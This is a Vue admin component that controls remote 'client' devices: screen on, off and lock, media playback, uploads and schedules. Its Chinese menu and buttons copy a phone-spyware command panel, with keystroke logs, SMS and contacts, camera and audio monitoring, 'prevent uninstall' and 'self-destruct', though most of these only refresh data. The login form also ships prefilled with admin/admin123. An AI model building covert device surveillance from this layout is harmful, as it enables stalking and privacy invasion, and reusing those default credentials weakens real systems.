<script setup>
import { computed, onBeforeUnmount, onMounted, ref } from 'vue'

const API_BASE = (import.meta.env.VITE_API_BASE || window.location.origin).replace(/\/$/, '')

const authToken = ref(localStorage.getItem('admin_token') || '')
const currentUser = ref(null)
const loginUsername = ref('admin')
const loginPassword = ref('admin123')

const loading = ref(false)
const syncing = ref(false)
const errorMessage = ref('')
const health = ref({ status: 'unknown', serverTime: '-', wsClients: 0 })
const clients = ref([])
const mediaLibrary = ref([])
const activity = ref([])
const schedules = ref([])
const activeTab = ref('control')

const selectedClientId = ref('ALL')
const screenAction = ref('on')
const selectedMediaId = ref('')
const loopPlayback = ref(false)
const volume = ref(70)

const scheduleTargetId = ref('ALL')
const scheduleMediaId = ref('')
const scheduleStartAt = ref('')
const scheduleRepeatMode = ref('once')
const scheduleLoop = ref(false)
const scheduleVolume = ref(70)

const registerName = ref('')
const registerType = ref('kiosk')
const uploadFile = ref(null)

const wsState = ref('disconnected')
let ws = null
let wsReconnectTimer = null
let wsReconnectAttempts = 0
let wsShouldReconnect = false

const WS_RETRY_BASE_MS = 1500
const WS_RETRY_MAX_MS = 30000
const WS_RETRY_MAX_ATTEMPTS = 10

const onlineCount = computed(() => clients.value.filter((c) => c.online).length)
const targetLabel = computed(() => {
  if (selectedClientId.value === 'ALL') return 'ALL CLIENTS'
  const found = clients.value.find((c) => c.id === selectedClientId.value)
  return found ? found.name : 'UNKNOWN'
})

const selectedClient = computed(() => {
  if (selectedClientId.value === 'ALL') {
    return clients.value[0] || null
  }
  return clients.value.find((c) => c.id === selectedClientId.value) || null
})

const selectedClientMedia = computed(() => {
  const mediaId = selectedClient.value?.currentMedia?.mediaId
  if (!mediaId) return null
  return mediaLibrary.value.find((m) => m.id === mediaId) || null
})

const leftActions = [
  { key: 'open', text: '开启', className: 'act-green' },
  { key: 'close', text: '关闭', className: 'act-red' },
  { key: 'lock', text: '锁屏模式', className: 'act-blue' },
  { key: 'light', text: '屏幕朗读', className: 'act-indigo' },
  { key: 'gallery', text: '相册(Gallery)', className: 'act-orange' },
  { key: 'sms', text: '短信(SMS)', className: 'act-cyan' },
  { key: 'record', text: '录音(Audio)', className: 'act-lime' },
  { key: 'muteOn', text: '开启静音', className: 'act-blue' },
  { key: 'muteOff', text: '关闭静音', className: 'act-blue' },
  { key: 'stopMedia', text: '屏屏遮挡', className: 'act-magenta' },
  { key: 'alarm', text: '防止卸载', className: 'act-yellow' },
  { key: 'allow', text: '允许操作', className: 'act-teal' },
  { key: 'destroy', text: '设备自毁', className: 'act-red' },
  { key: 'refresh', text: '刷新', className: 'act-gray' },
]

const deviceQuickActions = [
  { key: 'tap', text: '点亮屏幕', className: 'sky' },
  { key: 'off', text: '熄灭屏幕', className: 'navy' },
  { key: 'lock', text: '锁定屏幕', className: 'navy' },
  { key: 'mask', text: '屏屏遮挡', className: 'rose' },
  { key: 'cancel', text: '取消遮挡', className: 'gold' },
  { key: 'forbid', text: '阻止操作', className: 'violet' },
  { key: 'allow', text: '允许操作', className: 'teal' },
  { key: 'alarm', text: '防止卸载', className: 'amber' },
]

async function runLeftAction(key) {
  if (key === 'refresh') {
    await refreshData()
    await refreshHealth()
    return
  }
  if (key === 'stopMedia') {
    await stopMedia()
    return
  }
  if (key === 'open') {
    screenAction.value = 'on'
  }
  if (key === 'close') {
    screenAction.value = 'off'
  }
  if (key === 'lock') {
    screenAction.value = 'lock'
  }
  if (key === 'allow') {
    screenAction.value = 'unlock'
  }
  if (['light', 'gallery', 'sms', 'record', 'muteOn', 'muteOff', 'alarm', 'destroy'].includes(key)) {
    await refreshData()
    return
  }
  await sendScreenAction()
}

async function runDeviceQuickAction(key) {
  if (key === 'mask') {
    await stopMedia()
    return
  }
  if (key === 'cancel' || key === 'allow') {
    screenAction.value = 'unlock'
    await sendScreenAction()
    return
  }
  if (key === 'off') {
    screenAction.value = 'off'
    await sendScreenAction()
    return
  }
  if (key === 'lock' || key === 'forbid') {
    screenAction.value = 'lock'
    await sendScreenAction()
    return
  }
  if (['tap', 'alarm'].includes(key)) {
    screenAction.value = 'on'
    await sendScreenAction()
  }
}

function toWsUrl(apiBase) {
  const u = new URL(apiBase)
  const protocol = u.protocol === 'https:' ? 'wss:' : 'ws:'
  const tokenQuery = encodeURIComponent(authToken.value)
  return `${protocol}//${u.host}/ws?token=${tokenQuery}`
}

function setError(message) {
  errorMessage.value = message
  setTimeout(() => {
    if (errorMessage.value === message) {
      errorMessage.value = ''
    }
  }, 3200)
}

function clearWsReconnectTimer() {
  if (wsReconnectTimer) {
    clearTimeout(wsReconnectTimer)
    wsReconnectTimer = null
  }
}

function stopWsReconnect() {
  wsShouldReconnect = false
  wsReconnectAttempts = 0
  clearWsReconnectTimer()
}

async function api(path, options = {}) {
  const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) }
  if (authToken.value) {
    headers.Authorization = `Bearer ${authToken.value}`
  }

  const response = await fetch(`${API_BASE}${path}`, {
    headers,
    ...options,
  })

  if (!response.ok) {
    const body = await response.json().catch(() => ({}))
    throw new Error(body.error || `${response.status} ${response.statusText}`)
  }

  if (response.status === 204) return null
  return response.json()
}

async function login() {
  loading.value = true
  try {
    const response = await fetch(`${API_BASE}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: loginUsername.value, password: loginPassword.value }),
    })
    const body = await response.json().catch(() => ({}))
    if (!response.ok) {
      throw new Error(body.error || 'Login failed')
    }
    authToken.value = body.token
    currentUser.value = body.user
    localStorage.setItem('admin_token', body.token)
    await refreshHealth()
    await refreshData()
    connectWs()
  } catch (error) {
    setError(`Login failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

function logout() {
  stopWsReconnect()
  authToken.value = ''
  currentUser.value = null
  localStorage.removeItem('admin_token')
  clients.value = []
  mediaLibrary.value = []
  schedules.value = []
  activity.value = []
  if (ws) ws.close()
}

async function refreshHealth() {
  try {
    const result = await api('/api/health')
    health.value = result
  } catch (error) {
    setError(`Health check failed: ${error.message}`)
  }
}

async function refreshData() {
  if (!authToken.value) return
  syncing.value = true
  try {
    const [clientsResult, mediaResult, schedulesResult] = await Promise.all([
      api('/api/clients'),
      api('/api/media'),
      api('/api/schedules'),
    ])
    clients.value = clientsResult.data || []
    mediaLibrary.value = mediaResult.data || []
    schedules.value = schedulesResult.data || []
  } catch (error) {
    setError(`Data sync failed: ${error.message}`)
  } finally {
    syncing.value = false
  }
}

function applySnapshot(snapshot) {
  clients.value = snapshot.clients || []
  mediaLibrary.value = snapshot.mediaLibrary || []
  schedules.value = snapshot.schedules || []
  activity.value = snapshot.activity || []
  health.value = {
    ...health.value,
    serverTime: snapshot.serverTime || health.value.serverTime,
  }
}

function connectWs() {
  if (!authToken.value) return
  wsShouldReconnect = true
  clearWsReconnectTimer()

  const wsUrl = toWsUrl(API_BASE)
  wsState.value = 'connecting'
  if (ws) ws.close()
  ws = new WebSocket(wsUrl)

  ws.onopen = () => {
    wsState.value = 'connected'
    wsReconnectAttempts = 0
  }

  ws.onclose = () => {
    wsState.value = 'disconnected'
    if (!wsShouldReconnect || !authToken.value) {
      return
    }

    wsReconnectAttempts += 1
    if (wsReconnectAttempts > WS_RETRY_MAX_ATTEMPTS) {
      stopWsReconnect()
      setError('WebSocket reconnect stopped after too many retries')
      return
    }

    const backoff = Math.min(WS_RETRY_MAX_MS, WS_RETRY_BASE_MS * 2 ** (wsReconnectAttempts - 1))
    wsReconnectTimer = setTimeout(() => connectWs(), backoff)
  }

  ws.onerror = () => {
    wsState.value = 'error'
  }

  ws.onmessage = (event) => {
    try {
      const payload = JSON.parse(event.data)
      if (payload.type === 'snapshot') {
        applySnapshot(payload.data || {})
      }
      if (payload.type === 'activity') {
        activity.value = [payload.data, ...activity.value].slice(0, 20)
      }
      if (payload.type === 'error') {
        const message = payload?.data?.message || 'websocket error'
        if (/unauthorized|invalid token/i.test(message)) {
          stopWsReconnect()
        }
        setError(`WS error: ${message}`)
      }
    } catch {
      setError('WS payload parse error')
    }
  }
}

async function createSchedule() {
  if (!scheduleMediaId.value || !scheduleStartAt.value) {
    setError('Schedule membutuhkan media dan waktu mulai')
    return
  }

  loading.value = true
  try {
    await api('/api/schedules', {
      method: 'POST',
      body: JSON.stringify({
        targetId: scheduleTargetId.value === 'ALL' ? null : scheduleTargetId.value,
        mediaId: scheduleMediaId.value,
        startAt: new Date(scheduleStartAt.value).toISOString(),
        repeatMode: scheduleRepeatMode.value,
        loop: scheduleLoop.value,
        volume: Number(scheduleVolume.value),
      }),
    })
    scheduleStartAt.value = ''
    await refreshData()
  } catch (error) {
    setError(`Create schedule failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

async function toggleSchedule(item) {
  loading.value = true
  try {
    await api(`/api/schedules/${item.id}`, {
      method: 'PATCH',
      body: JSON.stringify({ enabled: !item.enabled }),
    })
    await refreshData()
  } catch (error) {
    setError(`Toggle schedule failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

async function deleteSchedule(item) {
  loading.value = true
  try {
    await api(`/api/schedules/${item.id}`, {
      method: 'DELETE',
    })
    await refreshData()
  } catch (error) {
    setError(`Delete schedule failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

async function sendScreenAction() {
  loading.value = true
  try {
    await api('/api/control/screen', {
      method: 'POST',
      body: JSON.stringify({
        targetId: selectedClientId.value === 'ALL' ? null : selectedClientId.value,
        action: screenAction.value,
      }),
    })
    await refreshHealth()
  } catch (error) {
    setError(`Screen command failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

async function stopMedia() {
  loading.value = true
  try {
    await api('/api/control/media/stop', {
      method: 'POST',
      body: JSON.stringify({
        targetId: selectedClientId.value === 'ALL' ? null : selectedClientId.value,
      }),
    })
  } catch (error) {
    setError(`Stop media failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

async function playMedia() {
  if (!selectedMediaId.value) {
    setError('Pick media first')
    return
  }

  loading.value = true
  try {
    await api('/api/control/media/play', {
      method: 'POST',
      body: JSON.stringify({
        targetId: selectedClientId.value === 'ALL' ? null : selectedClientId.value,
        mediaId: selectedMediaId.value,
        loop: loopPlayback.value,
        volume: Number(volume.value),
      }),
    })
  } catch (error) {
    setError(`Play media failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

function onFileChange(event) {
  uploadFile.value = event.target.files?.[0] || null
}

async function uploadMedia() {
  if (!uploadFile.value) {
    setError('Choose a media file before upload')
    return
  }

  loading.value = true
  try {
    const form = new FormData()
    form.append('file', uploadFile.value)
    const response = await fetch(`${API_BASE}/api/control/media/upload`, {
      method: 'POST',
      body: form,
      headers: authToken.value ? { Authorization: `Bearer ${authToken.value}` } : undefined,
    })
    if (!response.ok) {
      const body = await response.json().catch(() => ({}))
      throw new Error(body.error || `${response.status} ${response.statusText}`)
    }
    uploadFile.value = null
    await refreshData()
  } catch (error) {
    setError(`Upload failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

async function registerClient() {
  if (!registerName.value.trim()) {
    setError('Client name is required')
    return
  }

  loading.value = true
  try {
    await api('/api/clients/register', {
      method: 'POST',
      body: JSON.stringify({ name: registerName.value.trim(), type: registerType.value }),
    })
    registerName.value = ''
  } catch (error) {
    setError(`Register failed: ${error.message}`)
  } finally {
    loading.value = false
  }
}

onMounted(async () => {
  await refreshHealth()
  if (authToken.value) {
    try {
      const me = await api('/api/auth/me')
      currentUser.value = me.user
      await refreshData()
      connectWs()
    } catch {
      logout()
    }
  }
})

onBeforeUnmount(() => {
  stopWsReconnect()
  if (ws) ws.close()
})
</script>

<template>
  <main v-if="!authToken" class="panel-root">
    <section class="card" style="max-width: 460px; margin: 3rem auto">
      <p class="eyebrow">ADMIN AUTH</p>
      <h2>Login Control Panel</h2>
      <label>Username</label>
      <input v-model="loginUsername" type="text" />
      <label>Password</label>
      <input v-model="loginPassword" type="password" />
      <button class="btn" :disabled="loading" @click="login">Sign In</button>
      <small>Default dev credential: admin / admin123</small>
      <p v-if="errorMessage" class="error-banner">{{ errorMessage }}</p>
    </section>
  </main>

  <main class="panel-root" v-if="authToken">
    <header class="ruoyi-topbar">
      <div class="menu-items">
        <button class="menu-item">设备信息</button>
        <button class="menu-item">键盘记录</button>
        <button class="menu-item">短信记录</button>
        <button class="menu-item">通讯列表</button>
        <button class="menu-item active">摄像监控</button>
        <button class="menu-item">录音监控</button>
        <button class="menu-item">应用管理</button>
        <button class="menu-item">文件管理</button>
      </div>
      <div class="top-actions">
        <button class="menu-item" @click="activeTab = 'control'">控制台</button>
        <button class="menu-item" @click="activeTab = 'scheduler'">计划任务</button>
        <button class="menu-item danger" @click="logout">退出</button>
      </div>
    </header>

    <p v-if="errorMessage" class="error-banner">{{ errorMessage }}</p>

    <section v-if="activeTab === 'control'" class="top-control-strip">
      <button class="strip-btn green" :disabled="loading" @click="screenAction = 'on'; sendScreenAction()">开启</button>
      <button class="strip-btn red" :disabled="loading" @click="screenAction = 'off'; sendScreenAction()">关闭</button>
      <button class="strip-btn blue" :disabled="loading" @click="screenAction = 'lock'; sendScreenAction()">锁屏模式</button>
      <div class="strip-health">
        <span>设备 {{ onlineCount }}/{{ clients.length }}</span>
        <span>网络 {{ health.status }}</span>
      </div>
    </section>

    <section v-if="activeTab === 'control'" class="ruoyi-stage">
      <aside class="left-action-rail">
        <button
          v-for="item in leftActions"
          :key="item.key"
          class="left-action-btn"
          :class="item.className"
          :disabled="loading"
          @click="runLeftAction(item.key)"
        >
          {{ item.text }}
        </button>
      </aside>

      <section class="phone-preview-card">
        <div class="phone-toolbar">
          <label>目标设备</label>
          <select v-model="selectedClientId">
            <option value="ALL">全部设备</option>
            <option v-for="client in clients" :key="client.id" :value="client.id">
              {{ client.name }} ({{ client.type }})
            </option>
          </select>
          <button class="tiny-ctl" :disabled="syncing" @click="refreshData">刷新</button>
        </div>
        <div class="phone-mock">
          <div class="phone-screen">
            <img v-if="selectedClientMedia?.url" :src="selectedClientMedia.url" alt="client-media" />
            <div v-else class="phone-fallback">{{ selectedClient?.name || '未选择设备' }}</div>
          </div>
          <div class="phone-side-actions">
            <button
              v-for="action in deviceQuickActions"
              :key="action.key"
              class="mini-side"
              :class="action.className"
              @click="runDeviceQuickAction(action.key)"
            >
              {{ action.text }}
            </button>
          </div>
        </div>
      </section>

      <section class="camera-pane">
        <div class="camera-head">
          <h3>摄像监控</h3>
          <small>WS: <span :class="`ws-${wsState}`">{{ wsState }}</span></small>
        </div>
        <div class="camera-top-actions">
          <button class="pill primary">开启摄像</button>
          <button class="pill pink">关闭摄像</button>
          <select>
            <option>前置摄像头</option>
            <option>后置摄像头</option>
          </select>
        </div>
        <div class="camera-stream-box">
          <div class="stream-inner">
            <img v-if="selectedClientMedia?.url" :src="selectedClientMedia.url" alt="camera-stream" />
            <div v-else class="stream-fallback">无实时画面</div>
          </div>
        </div>

        <article class="ops-card">
          <h4>媒体与广播</h4>
          <label>媒体文件</label>
          <select v-model="selectedMediaId">
            <option value="">选择媒体</option>
            <option v-for="media in mediaLibrary" :key="media.id" :value="media.id">
              {{ media.name }}
            </option>
          </select>
          <label>音量 {{ volume }}%</label>
          <input v-model.number="volume" type="range" min="0" max="100" />
          <label class="inline-check"><input v-model="loopPlayback" type="checkbox" /> 循环播放</label>
          <div class="button-row">
            <button class="btn" :disabled="loading" @click="playMedia">播放</button>
            <button class="btn ghost" :disabled="loading" @click="stopMedia">停止</button>
          </div>
        </article>
      </section>
    </section>

    <section v-if="activeTab === 'control'" class="ruoyi-bottom">
      <article class="card table-card">
        <div class="row-head">
          <h2>设备列表</h2>
          <span class="fleet-count">在线 {{ onlineCount }} / {{ clients.length }}</span>
        </div>
        <div class="table-wrap">
          <table>
            <thead>
              <tr>
                <th>名称</th>
                <th>类型</th>
                <th>状态</th>
                <th>屏幕</th>
                <th>播放</th>
                <th>命令</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="client in clients" :key="client.id">
                <td>{{ client.name }}</td>
                <td>{{ client.type }}</td>
                <td>
                  <span :class="['chip', client.online ? 'ok' : 'down']">
                    {{ client.online ? 'online' : 'offline' }}
                  </span>
                </td>
                <td>{{ client.screenOn ? 'on' : 'off' }}</td>
                <td>{{ client.currentMedia?.name || '-' }}</td>
                <td>{{ client.lastCommand || '-' }}</td>
              </tr>
            </tbody>
          </table>
        </div>
      </article>

      <article class="card">
        <h2>活动记录</h2>
        <ul class="activity-list">
          <li v-for="item in activity" :key="item.id">
            <p class="meta">{{ item.createdAt }} - {{ item.level }}</p>
            <p>{{ item.message }}</p>
          </li>
        </ul>
      </article>
    </section>

    <section v-if="activeTab === 'scheduler'" class="grid">
        <article class="card">
          <h2>Create Playback Schedule</h2>
          <label>Target</label>
          <select v-model="scheduleTargetId">
            <option value="ALL">ALL CLIENTS</option>
            <option v-for="client in clients" :key="client.id" :value="client.id">
              {{ client.name }} ({{ client.type }})
            </option>
          </select>

          <label>Media</label>
          <select v-model="scheduleMediaId">
            <option value="">Select media</option>
            <option v-for="media in mediaLibrary" :key="media.id" :value="media.id">
              {{ media.name }}
            </option>
          </select>

          <label>Start Time</label>
          <input v-model="scheduleStartAt" type="datetime-local" />

          <label>Repeat</label>
          <select v-model="scheduleRepeatMode">
            <option value="once">once</option>
            <option value="daily">daily</option>
          </select>

          <label>Volume {{ scheduleVolume }}%</label>
          <input v-model.number="scheduleVolume" type="range" min="0" max="100" />

          <label class="inline-check">
            <input v-model="scheduleLoop" type="checkbox" /> Loop playback
          </label>

          <button class="btn" :disabled="loading" @click="createSchedule">Create Schedule</button>
        </article>

        <article class="card" style="grid-column: span 2">
          <h2>Schedule List</h2>
          <div class="table-wrap">
            <table>
              <thead>
                <tr>
                  <th>Media</th>
                  <th>Target</th>
                  <th>Next Run</th>
                  <th>Repeat</th>
                  <th>Status</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                <tr v-for="item in schedules" :key="item.id">
                  <td>{{ item.mediaName }}</td>
                  <td>{{ item.targetId || 'ALL' }}</td>
                  <td>{{ item.nextRunAt }}</td>
                  <td>{{ item.repeatMode }}</td>
                  <td>{{ item.enabled ? 'enabled' : 'disabled' }} / {{ item.status }}</td>
                  <td>
                    <div class="button-row">
                      <button class="btn ghost tiny" @click="toggleSchedule(item)">
                        {{ item.enabled ? 'Disable' : 'Enable' }}
                      </button>
                      <button class="btn ghost tiny" @click="deleteSchedule(item)">Delete</button>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </article>
      </section>
  </main>
</template>
